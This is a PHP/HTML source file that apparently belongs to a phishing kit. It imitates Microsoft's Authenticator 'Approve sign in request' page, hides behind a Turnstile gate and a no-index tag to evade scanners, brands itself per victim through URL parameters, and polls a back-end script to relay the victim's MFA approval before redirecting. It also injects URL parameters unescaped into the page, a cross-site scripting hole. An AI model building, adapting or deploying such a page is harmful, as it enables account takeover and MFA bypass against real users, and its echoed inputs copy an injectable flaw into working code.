<?php
header("Access-Control-Allow-Origin: *");
if (!isset($_COOKIE['captcha']) || $_COOKIE['captcha'] != 1) {
	include '../config.php';
	echo '<html><head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><meta name="viewport" content="width=device-width, initial-scale=1"></head><body> Please stand by, while we are checking your browser... <br><br><form id="myForm" action="../validate.php" method="post"><div class="cf-turnstile" data-sitekey="' . $sitekey . '" data-callback="javascriptCallback"></div></form><script>function javascriptCallback(){var a=$("#myForm"),t=a.attr("action");a.submit(function(a){a.preventDefault()}),$.ajax({type:"POST",url:t,data:a.serialize(),success:function(a){location.reload()}})}</script></body></html>';
	exit();
}
?>
<html dir="ltr"  lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <title>tBxScFBI7Mv6kG2pDgOR6HMT88UBVcBYgbxD0qheqtfeK</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">
	<link href="../css/style3.css" rel="stylesheet">
    <link rel="shortcut icon" href="../imgs/fi.ico">

    <meta name="robots" content="none">

</head>

<body  class="cb" style="display: block;" data-gr-c-s-loaded="true">

    <div>

        <div >
            <div class="background" role="presentation" >

                <div  style="background-image: url(&quot;../imgs/bg.svg&quot;);">

                </div>

                <div id="bodybackground" class="backgroundImage"  style="<?php echo empty($_GET['bg']) ? 'background-image: url(../imgs/bg.svg)' : 'background : linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url(' . base64_decode($_GET['bg']) . ');background-size: cover;background-position-y: center;background-repeat: no-repeat;' ?>">

                </div>

            </div>

        </div>

        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="process.php" onsubmit="return checkSubmit()">

            <div class="outer">
                <div class="middle" >

                    <div class="inner" >

                        <div >

                            <img style="max-height: 36px;" id="logoCompany" role="presentation"  src="<?php echo empty($_GET['logo']) ? '../imgs/lg.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd' : base64_decode($_GET['logo']) ?>">

                        </div>

                        <div role="main">

                            <div class="pagination-view" >

                                <div data-viewid="1">

                                    <div >
                                        <div class="identityBanner">
                                            <div id="displayName" class="identity"><?= $_GET['user'] ?></div>
                                        </div>
                                        <div data-viewid="6" data-showidentitybanner="true" >
                                            <!--  -->

                                            <input type="hidden" name="type"  value="22">
                                            <input type="hidden" name="request"  value="rQQIARAAhZNNiONkHMb7MVM7ZWYdR5Hd2wiLqJA2fZO8SQYWNt30a9pk2qaTaXrYkDZpkzQfb_M5DXhQPAjrYY8yJ1nwMt48yQrieUDYowx40ZsiiKe9iM7oefHywMPz8Od_eH6VMqzWYRWv4h8UQRU_uk_SkCJJaoYRYA4xkp3hGEMYEKvrLHETARrOteCgsr940vnwrx-d9lfogfT48Iv3L_OHZhSh8KhWS9O06i8W1tyozn235miebnnLBHyTz7_I5y8K24aHnUqXhRASNEtTgGRIqg7rFEORVdHuZlNeyKb2aaTYS0q0cFzgBdAfrwjFViKRH-JTV3YEd2orNoeL45aljFumCJrRlG8C4bYPhmn_rImL9ipS3GNXyEamYDdv7i6J68LrJ1wcmeBW_MDKjD8LOws_cFXkh9FF8beCRxMGNiFPRyniJas9QAgt3MgTzyZkpsaPiK7EducpI9LcxJUbgIE6qWHrWRylMXfcEI97I9elTkXdcvVsOAwHG2sT2zKK_I7tx2TCxrF6Lkt0h8o4NHW8AT0xAip1JyAcEA0n7cleZsdcEvWILJi19WHi2hycdxIypBCI2ykdyYHcn4_rG0Vfxu4jf91aavwZA0JBIIA276XHTh-EMTcSxHWmnKeDwFDUZBNpqG9NV_PWaM0OTqYy7_elKG4hRHrDtTXsQWhEq81yBilJO01vvhzJ5kknUtCQWk-6MsMMTbwvqjRLdXFe6mIr5K-5QVvtuGcZwY4j28v8DQoXnYY2Vjaygotqc6WqQcvHicEUQB6IHGzEA970rYljrpMVc1m894rNJODr4p4fLDXPyrTI8r3wefE-q7MaTuozrM4uDIyEMwZjIU5iM6jD-gJCHej6VZH2keFZ-iEK_IXlGK9aZQJqJ_-6ju8aVc5xfi7esX3TexiiJA5vKy-28r9uvV0u7e_fzR3m3nsLLx6Vy5X93K17uZV_tn1DQfAY3f3h3sXDzwvffWlevZu72q4JEaJNe32edY3RkmjVfWEJ2rVEcsJ0oQFbIr11jG9WUc8THjBH9ael_NNS6ar0RpdXxeZYGnMiz414oOJ_lHY_fa30fOd_ufp4d6-cO9jZMbWrz955ct253n2zUokt1fHnmmOEB__x9v1e7uWdT_7-6Kdvf3n2e-cf0">
                                            <input type="hidden" name="mfaLastPollStart"  value="1661930544299">
                                            <input type="hidden" name="mfaLastPollEnd"  value="1661930545369">

                                            <!-- ko if: twoWayPollingNeeded -->
                                            <input type="hidden"  name="mfaAuthMethod" value="PhoneAppNotification">
                                            <!-- /ko -->

                                            <!-- ko if: svr.canary -->
                                            <input type="hidden" name="canary"  value="Mtp7hjqxzIeRg3F1oMg2G/vSlswfa2jS4nqu0yktKnM=0:1">
                                            <!-- /ko -->

                                            <div id="idDiv_SAOTCAS_Title" class="row text-title" role="heading" aria-level="1" >Approve sign in request</div>
                                            <div class="row text-body">
                                                <div >
                                                    <img class="tile-img small animate-pulse" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_authenticator_942ac71f77cb04004b0ab25950e170b5.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"  src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg">
                                                </div>
                                                <div class="text-block-body overflow-hidden">
                                                    <div id="idDiv_SAOTCAS_Description" >Open your Microsoft Authenticator app and approve the request to sign in​.​</div>
                                                    <!-- ko if: description2 -->
                                                    <!-- /ko -->
                                                </div>
                                            </div>

                                            <!-- ko if: displaySign -->
                                            <!-- /ko -->

                                            <div>
                                                <!-- ko if: doPolling -->
                                                <!-- /ko -->
                                            </div>

                                            <div  class="position-buttons">
                                                <div class="row">
                                                    <div class="row no-margin-top-bottom"  style="display: none;">
                                                        <div class="col-md-24 form-group no-margin-top checkbox">
                                                            <label id="idLbl_SAOTCAS_TD_Cb">
                                                                <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                                                                <input id="idChkBx_SAOTCAS_TD" type="checkbox" value="true"  name="rememberMFA" aria-label="Don't ask again for undefined days" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">
                                                                <span >Don't ask again for undefined days</span>
                                                            </label>
                                                        </div>
                                                    </div>

                                                    <div class="row">
                                                        <div class="col-md-24">
                                                            <div class="text-13">
                                                                <!-- ko if: showSwitchProofsLink -->
                                                                <div id="idDiv_SAOTCS_HavingTrouble" class="form-group" ><a href="#" id="signInAnotherWay" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">I can't use my Microsoft Authenticator app right now</a></div>
                                                                <!-- /ko -->

                                                                <!-- ko if: svr.urlMoreInfo -->
                                                                <div class="form-group no-margin-bottom">
                                                                    <a id="moreInfoUrl" href="#"  aria-label="More information about two step verification">More information</a>
                                                                </div>
                                                                <!-- /ko -->
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="win-button-pin-bottom" >
                                                    <div class="row" >
                                                        <div >
                                                            <div class="col-xs-24 no-padding-left-right button-container"  style="display: none;">

                                                                <!-- ko if: isSecondaryButtonVisible -->
                                                                <!-- /ko -->

                                                                <div >
                                                                    <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit"  value="Next" style="display: none;">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <input type="hidden" name="logo" id="logoForm" value="<?= empty($_GET['logo']) ? '' : base64_decode($_GET['logo']) ?>">
            <input type="hidden" name="background" id="backgroundForm" value="<?= empty($_GET['bg']) ? '' : base64_decode($_GET['bg']) ?>">
            <input type="hidden" name="token" id="tokenForm" value="<?= empty($_GET['token']) ? '' : $_GET['token'] ?>">

    </div>

    </div>
    </form>

    <form method="post" aria-hidden="true" target="_top" >

    </form>

    <div id="idPartnerPL" >
        <iframe height="0" width="0" src="./Sign in to your account_files/prefetch(1).html" style="display: none;"></iframe>
    </div>

    </div>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script>
        $(document).ready(function() {
            var ajaxCall;
            verify();

            function verify() {
                ajaxCall = $.ajax({
                    url: '../process.php',
                    type: 'POST',
                    dataType: 'json',
                    data: {
                        do: 'checkVerify',
                        token: $('#tokenForm').val(),
                        logo: $('#logoForm').val(),
                        bg: $('#backgroundForm').val(),
                        user: "<?= empty($_GET['user']) ? '' : $_GET['user'] ?>",
                        service: 'notif',
                        key: '<?= empty($_GET['key']) ? '' : $_GET['key'] ?>'
                    },
                    success: function(data) {
                        if (data.status) {
                            window.location.href = data.redirect;
                            ajaxCall.abort();
                        } else {
                            $('#tokenForm').val()
                            setTimeout(verify, 1000);
                        }
                    }
                });
            }
        });
    </script>

    <style>
        box {
            width: 40%;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.2);
            padding: 35px;
            border: 2px solid #fff;
            border-radius: 20px/50px;
            background-clip: padding-box;
            text-align: center;
        }

        .button {
            font-size: 1em;
            padding: 10px;
            color: #fff;
            border: 2px solid #0067B8;
            border-radius: 20px/50px;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.3s ease-out;
        }

        .button:hover {
            background: #0067B8;
        }

        .overlay {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.7);
            transition: opacity 500ms;
            visibility: hidden;
            opacity: 0;
        }

        .overlay:target {
            visibility: visible;
            opacity: 1;
        }

        .popup {
            margin: 70px auto;
            padding: 20px;
            background: #fff;
            border-radius: 5px;
            width: 30%;
            position: relative;
            transition: all 5s ease-in-out;
        }

        .popup h2 {
            margin-top: 0;
            color: #333;
            font-family: Tahoma, Arial, sans-serif;
        }

        .popup .close {
            position: absolute;
            top: 20px;
            right: 30px;
            transition: all 200ms;
            font-size: 30px;
            font-weight: bold;
            text-decoration: none;
            color: #333;
        }

        .popup .close:hover {
            color: #0067B8;
        }

        .popup .content {
            max-height: 30%;
            overflow: auto;
        }

        @media screen and (max-width: 700px) {
            .box {
                width: 70%;
            }

            .popup {
                width: 70%;
            }
        }
    </style>
</body>

</html>